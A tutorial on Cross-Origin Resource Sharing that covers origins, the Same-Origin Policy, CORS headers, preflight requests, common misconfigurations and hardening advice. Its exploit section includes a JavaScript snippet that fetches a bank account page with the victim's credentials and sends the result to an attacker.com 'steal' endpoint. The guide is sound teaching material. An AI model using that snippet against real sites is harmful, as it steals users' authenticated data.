# Cross-Origin Resource Sharing (CORS)

## What is CORS?

Cross-Origin Resource Sharing (CORS) is a browser security mechanism that allows a web application running on one origin to request resources from a different origin.

By default, web browsers enforce a security policy called the **Same-Origin Policy (SOP)** which blocks web pages from making requests to a different origin unless the server explicitly allows it.

CORS is the mechanism that **relaxes the Same-Origin Policy in a controlled way** by using special HTTP headers.

---

# Understanding Origin

An **origin** is defined by three components:

scheme + domain + port


Example:

https://example.com:443


Two URLs are considered the **same origin** only if all three components match.

Example comparison:

https://example.com
https://example.com


Same origin.

https://example.com
http://example.com


Different origin because the **scheme** is different.

https://example.com
https://api.example.com


Different origin because the **domain** is different.

---

# Same-Origin Policy (SOP)

The Same-Origin Policy is a browser security feature that prevents JavaScript running on one origin from accessing resources on another origin.

Example:

https://attacker.com


JavaScript running on this site **cannot read responses from**

https://bank.com/account


This prevents attackers from stealing sensitive data such as:

- session cookies
- API responses
- private user information

However, browsers still allow **sending requests cross-origin**, but the attacker cannot **read the response** unless the server allows it.

---

# Why CORS Exists

Many modern applications use APIs hosted on different domains.

Example:

Frontend:
https://app.example.com

API:
https://api.example.com


Without CORS, the frontend would not be able to read responses from the API.

CORS allows the server to explicitly say:

"This origin is allowed to access my resources"


---

# How CORS Works

When a browser sends a cross-origin request, it includes an **Origin header**.

Example request:

GET /api/user HTTP/1.1
Host: api.example.com
Origin: https://app.example.com


The server then decides whether to allow the request.

If allowed, it returns a response header:

Access-Control-Allow-Origin


Example response:

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.example.com


Now the browser allows JavaScript from that origin to read the response.

---

# Important CORS Headers

## Access-Control-Allow-Origin

Specifies which origin is allowed to read the response.

Example:

Access-Control-Allow-Origin: https://example.com


Allow only one origin.

Example allowing any origin:

Access-Control-Allow-Origin: *


---

## Access-Control-Allow-Credentials

Allows cookies and authentication headers to be included.

Example:

Access-Control-Allow-Credentials: true


Important rule:

Access-Control-Allow-Origin cannot be "*"
when credentials are enabled.


---

## Access-Control-Allow-Methods

Specifies which HTTP methods are allowed.

Example:

Access-Control-Allow-Methods: GET, POST, PUT, DELETE


---

## Access-Control-Allow-Headers

Specifies which custom headers can be sent in the request.

Example:

Access-Control-Allow-Headers: Authorization, Content-Type


---

# Simple Requests vs Preflight Requests

CORS requests are divided into two types.

---

## Simple Requests

A request is considered simple if it uses:

GET
POST
HEAD


and does not include custom headers.

Example:

GET /api/user HTTP/1.1
Origin: https://example.com


The browser sends the request directly.

---

## Preflight Requests

If the request uses:

PUT
DELETE
PATCH
custom headers


the browser sends a **preflight request** first.

This is an HTTP **OPTIONS** request used to check if the server allows the request.

Example:

OPTIONS /api/user HTTP/1.1
Origin: https://example.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Authorization


Server response:

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: PUT
Access-Control-Allow-Headers: Authorization


If allowed, the browser sends the real request.

---

# Example CORS Flow

Step 1 — Browser sends request

GET /api/data HTTP/1.1
Host: api.example.com
Origin: https://attacker.com


Step 2 — Server response

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://attacker.com


Step 3 — Browser decision

If the origin matches → allow JavaScript to read response
If not → block response


---

# CORS Misconfigurations

Improper CORS configuration can lead to serious security vulnerabilities.

---

## 1. Reflecting Arbitrary Origins

Some servers reflect the Origin header directly.

Example request:

Origin: https://attacker.com


Server response:

Access-Control-Allow-Origin: https://attacker.com


This allows any malicious site to access sensitive data.

---

## 2. Wildcard with Credentials

Example:

Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true


This configuration is insecure and browsers usually block it.

---

## 3. Trusting Subdomains

Example:

Access-Control-Allow-Origin: *.example.com


If an attacker controls a subdomain, they can bypass CORS protections.

---

# Example CORS Exploit

If a server allows attacker origin:

Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true


An attacker can steal sensitive data.

Example malicious JavaScript:

fetch("https://bank.com/api/account", {
credentials: "include"
})
.then(res => res.text())
.then(data => {
fetch("https://attacker.com/steal?data=" + data);
});


Explanation:

Victim visits attacker website

Browser sends authenticated request to bank.com

Bank response is allowed by CORS

Attacker reads the response

Data is exfiltrated


---

# Impact of CORS Vulnerabilities

If misconfigured, CORS vulnerabilities can lead to:

Sensitive data exposure
Account information leakage
API data theft
User information disclosure
Session abuse


---

# How to Secure CORS

## 1. Use Strict Origin Whitelisting

Example:

Access-Control-Allow-Origin: https://app.example.com


Never allow arbitrary origins.

---

## 2. Avoid Wildcards with Sensitive Data

Do not use:

Access-Control-Allow-Origin: *


for authenticated APIs.

---

## 3. Validate the Origin Header Properly

Check the origin against a **trusted whitelist**.

---

## 4. Limit Allowed Methods and Headers

Example:

Access-Control-Allow-Methods: GET, POST


---

# Key Takeaway

CORS is a browser security mechanism that allows controlled cross-origin access.

Core concept:

Browser sends Origin header
Server decides if that origin is allowed
Browser enforces the decision


If misconfigured, CORS can allow attackers to read sensitive data from another origin.
